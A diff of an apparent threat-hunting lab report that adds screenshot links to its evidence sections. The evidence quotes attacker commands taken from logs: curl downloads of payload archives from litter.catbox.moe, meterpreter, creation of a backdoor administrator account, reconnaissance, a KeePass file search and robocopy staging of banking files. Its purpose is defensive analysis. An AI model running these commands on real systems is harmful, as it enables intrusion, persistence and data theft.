@@ -196,6 +196,7 @@ DeviceLogonEvents
 ```
 
 ### Evidence
+<img width="1607" height="423" alt="image" src="https://github.com/user-attachments/assets/9374b56e-91a9-46aa-b4d6-8a785e3d4625" />
 
 ```text
 Earliest Confirmed Event: 2025-11-25 04:06:52.757 UTC
@@ -252,6 +253,7 @@ DeviceNetworkEvents
 ```
 
 ### Evidence
+<img width="1035" height="494" alt="image" src="https://github.com/user-attachments/assets/2da2ad11-29a2-4ff4-87c3-02374b91a483" />
 
 ```text
 Remote Service: litter.catbox.moe
@@ -302,6 +304,8 @@ DeviceProcessEvents
 ```
 
 ### Evidence
+
+<img width="1036" height="546" alt="image" src="https://github.com/user-attachments/assets/a286c3eb-ec54-4bb9-87a3-ffc435beb683" />
 
 ```text
 "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z
@@ -354,6 +358,8 @@ DeviceProcessEvents
 
 ### Evidence
 
+<img width="800" height="600" alt="image" src="https://github.com/user-attachments/assets/4c9a9588-9295-4c5d-8898-bd005923cb75" />
+
 ```text
 "7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y
 ```
@@ -402,6 +408,8 @@ DeviceFileEvents
 ```
 
 ### Evidence
+
+<img width="1639" height="1120" alt="image" src="https://github.com/user-attachments/assets/917da9c6-37e1-4cc2-80b9-a4f43a637429" />
 
 ```text
 File: meterpreter.exe
@@ -456,6 +464,7 @@ DeviceEvents
 ```
 
 ### Evidence
+<img width="2650" height="1161" alt="image" src="https://github.com/user-attachments/assets/4245623a-1e58-43e6-a0cf-eb288b25143e" />
 
 ```text
 Timestamp: 2025-11-25 04:24:35 UTC
@@ -509,10 +518,23 @@ DeviceProcessEvents
 
 ### Evidence
 
+<img width="2670" height="823" alt="image" src="https://github.com/user-attachments/assets/087f74d2-578d-4462-8824-ccd72ebf96ba" />
+
 ```text
 net user yuki.tanaka2 B@ckd00r2024! /add
+```
+
+<img width="2359" height="1122" alt="image" src="https://github.com/user-attachments/assets/b01a963b-e461-44ea-9cea-a1e8d5e55b72" />
+
+
+```text
 net localgroup Administrators yuki.tanaka2 /add
 ```
+
+
+<img width="2358" height="1231" alt="image" src="https://github.com/user-attachments/assets/bde7333e-3404-462e-ab4d-0d0e25dcd3fa" />
+
+
 
 ### Command Context
 PowerShell `-EncodedCommand` commonly uses Base64-encoded UTF-16LE text. Base64 is not encryption; it obscures readable command strings from simple inspection and basic string matching. The first decoded command created a local account, and the second added that account to the local Administrators group.
@@ -562,7 +584,9 @@ DeviceProcessEvents
 ```
 
 ### Evidence
-`qwinsta`
+
+<img width="1925" height="572" alt="image" src="https://github.com/user-attachments/assets/79c9519a-2611-4c9e-9ad7-834dccefb22b" />
+
 
 ### Command Context
 `qwinsta` is a built-in Windows command that displays Terminal Services / Remote Desktop sessions, including session names, users, IDs, and states. Administrators use it for session management; attackers can use the same information to identify active users or potentially valuable sessions.
@@ -606,6 +630,9 @@ DeviceProcessEvents
 ```
 
 ### Evidence
+
+<img width="2075" height="343" alt="image" src="https://github.com/user-attachments/assets/134f425b-ce54-43a3-b734-9467e0099c7f" />
+
 `"nltest.exe" /domain_trusts /all_trusts`
 
 ### Command / Technique Context
@@ -651,6 +678,9 @@ DeviceProcessEvents
 ```
 
 ### Evidence
+
+<img width="2767" height="246" alt="image" src="https://github.com/user-attachments/assets/32cafb93-246f-4e7b-8670-040ef1f172fd" />
+
 `"NETSTAT.EXE" -ano`
 
 ### Command Context
@@ -699,6 +729,9 @@ DeviceProcessEvents
 ```
 
 ### Evidence
+
+<img width="2339" height="560" alt="image" src="https://github.com/user-attachments/assets/77f1a796-de75-4b63-8eac-bafa2ff8552e" />
+
 `"cmd.exe" /c where /r C:\Users *.kdbx`
 
 ### Command / Artifact Context
@@ -747,6 +780,9 @@ DeviceFileEvents
 ```
 
 ### Evidence
+
+<img width="2652" height="561" alt="image" src="https://github.com/user-attachments/assets/f2ba7755-49f8-4b92-b0bc-c4cb58c551b6" />
+
 `OLD-Passwords.lnk`
 
 ### Artifact Context
@@ -792,6 +828,9 @@ DeviceFileEvents
 ```
 
 ### Evidence
+
+<img width="2658" height="777" alt="image" src="https://github.com/user-attachments/assets/bd3162f5-9d61-47b3-894d-5502e36b81fd" />
+
 `C:\ProgramData\Microsoft\Crypto\staging`
 
 Banking statement files were observed beneath subdirectories of the staging path.
@@ -844,6 +883,8 @@ DeviceFileEvents
 ### Evidence
 `"Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP`
 
+<img width="2656" height="709" alt="image" src="https://github.com/user-attachments/assets/60bf17fa-55a7-45ba-b774-267551010962" />
+
 ### Command Context
 `Robocopy` is a built-in Windows utility designed for reliable bulk file copying. `/E` copies all subdirectories, `/R:1` retries failed copies once, `/W:1` waits one second between retries, and `/NP` suppresses progress percentage output.
 
@@ -890,6 +931,7 @@ DeviceFileEvents
 
 ### Evidence
 `8 unique archive filenames were identified in the staging directory.`
+<img width="2701" height="774" alt="image" src="https://github.com/user-attachments/assets/0de3faa5-65dd-4690-9c57-9f7d13a4d7d8" />
 
 Observed archive names included credential-, banking-, tax-, contract-, and browser-related data.
 
@@ -948,6 +990,8 @@ DeviceProcessEvents
 
 ### Evidence
 `"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z`
+<img width="2751" height="454" alt="image" src="https://github.com/user-attachments/assets/d3a28645-db87-4638-bec7-07bb3a22599e" />
+
 
 ### Analysis
 The attacker reused the same file-hosting infrastructure identified earlier. Because `curl.exe` was already explained in Finding 5, the important difference here is the new payload, `m-temp.7z`, which supported the credential-access phase.
@@ -974,7 +1018,10 @@ An interesting exfiltration artifact, `chrome-session-theft.tar.gz`, provided th
 ### Investigation Approach
 `DeviceProcessEvents` was reviewed between `05:50` and `05:57 UTC` to reconstruct the activity immediately before the Chrome-related archive was created and uploaded.
 
+<img width="2675" height="346" alt="image" src="https://github.com/user-attachments/assets/865f8500-ab23-4f70-bd42-7a534bcb1ef6" />
+
 ### Query / Search Used
+
 
 **KQL Name: `Chrome Credential Theft Timeline`**
 
@@ -988,6 +1035,7 @@ DeviceProcessEvents
 ```
 
 ### Evidence
+
 
 ```text
 05:55:34  curl.exe  → downloaded m-temp.7z
